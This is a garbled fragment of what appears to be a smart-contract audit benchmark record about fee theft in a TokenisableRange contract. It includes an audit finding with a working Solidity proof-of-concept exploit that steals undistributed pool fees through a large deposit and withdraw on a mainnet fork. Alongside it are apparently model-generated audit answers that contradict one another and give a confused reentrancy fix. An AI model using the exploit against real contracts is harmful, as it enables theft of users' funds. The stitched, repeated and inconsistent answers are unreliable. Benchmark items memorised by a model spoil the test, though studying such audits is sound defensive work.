of the pool assets) can be s stolen risk-free by simply depositing and withdrawing a large quantity of liquidity:\n```Solidity\n    function testStolenFeesPoc() public {\n        vm.createSelectFork(\n            \"mainnet\",\n            17811921\n        );\n\n        vm.prank(tokenWhale);\n        USDC.transfer(alice, 100_000e6);\n\n        vm.startPrank(alice);\n        TokenisableRange tr = new TokenisableRange();\n\n        // out of range: WETH is more valuable than that (about 1870 USDC on this block 17811921); \n        // the pool will hold 0 WETH\n        tr.initProxy(AaveOracle, USDC, WETH, 500e10, 1000e10, \"Test1\", \"T1\", false);\n\n        USDC.approve(address(tr), 100_000e6);\n        tr.init(100_000e6, 0);\n\n        // time passes, and the pool trades in range, accumulating fees\n        uint256 fee0 = 1_000e6;\n        uint256 fee1 = 2e18;\n\n        vm.mockCall(address(UniswapV3UsdcNFPositionManager), \n            abi.encodeWithSelector(INonfungiblePositionManager.collect.selector), \n            abi.encode(fee0, fee1));\n\n        vm.stopPrank();\n        vm.startPrank(tokenWhale);\n        USDC.transfer(address(tr), fee0);\n        WETH.transfer(address(tr), fee1);\n\n        // now the price is back to 1870 USDC,\n        // the undistributed fees are 1k USDC and 2 WETH, \n        // in total about $5k or 5% of the pool value \n        // (the percentage can be higher with bigger price swings)\n        // but still, they are not reinvested\n        tr.claimFee();\n        vm.clearMockedCalls();\n        require(tr.fee0() != 0);\n        require(tr.fee1() != 0);\n\n        // an attacker now can flashloan & deposit an amount that will give them\n        // the majority of the pool liquidity, then withdraw for a profit\n        uint256 usdcBalanceBefore = USDC.balanceOf(tokenWhale);\n        uint256 wethBalanceBefore = WETH.balanceOf(tokenWhale);\n        uint256 poolSharesBefore = tr.balanceOf(tokenWhale);\n\n        USDC.approve(address(tr), 10_000_000e6);\n        // this is the hack: we add just a tiny little bit of WETH so TokenisableRange doesn't\n        // count the value locked in fees in assigning the LP tokens\n        WETH.approve(address(tr), 1000);\n        uint256 deposited = tr.deposit(10_000_000e6, 1000);\n        tr.withdraw(deposited, 0, 0);\n\n        // the profit here is\n        // 1 wei of USDC lost, probably to rounding\n        console2.log(int(USDC.balanceOf(tokenWhale)) - int(usdcBalanceBefore)); \n        // 1.58 WETH of profit, which is most of the fees, \n        // and definitely more than 1% of the pool.

Moreover, the handling of the subtraction of treasury fees (tf0 and tf1) from the new fees before adding them to the accumulated fee totals is also correct. It is designed in a way that the fee totals are only incremented, thereby eliminating the risk of decrementing to the point of underflow. Therefore, the provided code is correctly implemented to avert underflow vulnerabilities in the fee growth procedure.",

The function `claimFee()` calls an external contract `POS_MGR` to collect fees (`POS_MGR.collect()`) at the beginning of the function.\n2. After the external call, there are state updates remaining in the function, such as updating `fee0` and `fee1` variables, calculating expected balance, and potentially increasing the allowance and adding fees to Uniswap position.\n3. If the external contract `POS_MGR` is malicious or compromised, it can recursively call the `claimFee()` function again before the state updates are completed, causing potential cross-function reentrancy attacks.\n\nTo mitigate this vulnerability, the best practice is to follow the Checks-Effects-Interactions pattern, where all external calls should be placed after all state updates have taken place. In this case, moving the `POS_MGR.collect()` call to the end of the function after all state updates would help prevent potential reentrancy attacks.",

In this case, an attacker could potentially manipulate the `newLiquidity`, `added0`, and `added1` variables to alter the state of the contract in an unintended way. To mitigate this risk, you could consider following the Checks-Effects-Interactions pattern, where you perform state checks and updates before making external calls.\n\nFor example, you could move the state updates related to `fee0`, `fee1`, and `liquidity` after the `POS_Manger.increaseLiquidity()` function call:\n```scss\nfunction claimFee() public {\n   (uint256 newFee0, uint256 newFee1) = POS_MGR.collect(\n     INonfungiblePositionManager.CollectParams({\n       tokenId: tokenId,\n       recipient: address(this),\n       amount0Max: type(uint128).max,\n       amount1Max: type(uint128).max\n     })\n   );\n   // If there's no new fees generated, skip compounding logic;\n   if ((newFee0 == 0) && (newFee1 == 0)) return;  \n   uint tf0 = newFee0 * treasuryFee / 100;\n   uint tf1 = newFee1 * treasuryFee / 100;\n   if (tf0 > 0) TOKEN0.token.safeTransfer(treasury, tf0);\n   if (tf1 > 0) TOKEN1.token.safeTransfer(treasury, tf1);\n\n   // Calculate expected balance,  \n",

        "gtraw": "\n# Vulnerability details\n\nThe `TokenisableRange` is designed to always collect trading fees from the Uniswap V3 pool, whenever there is a liquidity event (`deposit` or `withdraw`). These fees may be reinvested in the pool, or may be held in form of `fee0` and `fee1` ERC-20 balance held by the TokenisableRange contract.\n\nWhen a user deposits liquidity in the range, they pay asset tokens, and receive back liquidity tokens, which give them a share of the TokenisableRange assets (liquidity locked in Unisvap V3, plus fee0, and fee1).\n\nTo prevent users from stealing fees, there are several mechanisms in place:\n1. fees are, as said, always collected whenever liquidity is added or removed, and whenever they exceed 1% of the liquidity in the pool, they are re-invested in Uniswap V3. The intention of this check seems to be limiting the value locked in these fees\n2. whenever a user deposits liquidity to the range, the LP tokens given to them are scaled down by the value of the fees, so the participation in fees \"is not given away for free\"\n\nBoth of these mechanisms can however be worked around:\n1. the 1% check is done on the `fee0` and `fee1` **amounts** compared to the theoretical pool amounts, and **not on the total value of the fees** as compared to the total value locked in the pool. This means that when the price changes significantly from when fees were accumulated, the combined value of the fees can exceed, potentially by much, the 1% intended cap, without the reinvestment happening before liquidity events. A malicious user can then monitor and act in such market conditions.\n2. the downscaling of the LP tokens minted to the user happens only if none of the provided liquidity is added to the pool fees instead of the Uniswap V3 position. The user can send just a few wei's of tokens to short-circuit the downscaling, and have a share of fees \"for free\".\n\n## Impact\nGiven a TokenisableRange contract in the right state (high value locked in fees, but still no reinvestment happening) a user can maliciously craft a `deposit` and `withdraw` sequence (why not, with flash-loaned assets) to steal most of the fees (`fee0`, `fee1`) held by the pool before distribution.\n\n## Proof of Concept\nBelow is a working PoC that shows under real market conditions how most of the fees (>3% of the pool assets) can be s stolen risk-free by simply depositing and withdrawing a large quantity of liquidity:\n```Solidity\n    function testStolenFeesPoc() public {\n        vm.createSelectFork(\n            \"mainnet\",\n            17811921\n        );\n\n        vm.prank(tokenWhale);\n        USDC.transfer(alice, 100_000e6);\n\n        vm.startPrank(alice);\n        TokenisableRange tr = new TokenisableRange();\n\n        // out of range: WETH is more valuable than that (about 1870 USDC on this block 17811921); \n        // the pool will hold 0 WETH\n        tr.initProxy(AaveOracle, USDC, WETH, 500e10, 1000e10, \"Test1\", \"T1\", false);\n\n        USDC.approve(address(tr), 100_000e6);\n        tr.init(100_000e6, 0);\n\n        // time passes, and the pool trades in range, accumulating fees\n        uint256 fee0 = 1_000e6;\n        uint256 fee1 = 2e18;\n\n        vm.mockCall(address(UniswapV3UsdcNFPositionManager), \n            abi.encodeWithSelector(INonfungiblePositionManager.collect.selector), \n            abi.encode(fee0, fee1));\n\n        vm.stopPrank();\n        vm.startPrank(tokenWhale);\n        USDC.transfer(address(tr), fee0);\n        WETH.transfer(address(tr), fee1);\n\n        // now the price is back to 1870 USDC,\n        // the undistributed fees are 1k USDC and 2 WETH, \n        // in total about $5k or 5% of the pool value \n        // (the percentage can be higher with bigger price swings)\n        // but still, they are not reinvested\n        tr.claimFee();\n        vm.clearMockedCalls();\n        require(tr.fee0() != 0);\n        require(tr.fee1() != 0);\n\n        // an attacker now can flashloan & deposit an amount that will give them\n        // the majority of the pool liquidity, then withdraw for a profit\n        uint256 usdcBalanceBefore = USDC.balanceOf(tokenWhale);\n        uint256 wethBalanceBefore = WETH.balanceOf(tokenWhale);\n        uint256 poolSharesBefore = tr.balanceOf(tokenWhale);\n\n        USDC.approve(address(tr), 10_000_000e6);\n        // this is the hack: we add just a tiny little bit of WETH so TokenisableRange doesn't\n        // count the value locked in fees in assigning the LP tokens\n        WETH.approve(address(tr), 1000);\n        uint256 deposited = tr.deposit(10_000_000e6, 1000);\n        tr.withdraw(deposited, 0, 0);\n\n        // the profit here is\n        // 1 wei of USDC lost, probably to rounding\n        console2.log(int(USDC.balanceOf(tokenWhale)) - int(usdcBalanceBefore)); \n        // 1.58 WETH of profit, which is most of the fees, \n        // and definitely more than 1% of the pool.

Therefore, there is no need for it to handle token approvals during an update process, and the vulnerability described does not apply.",
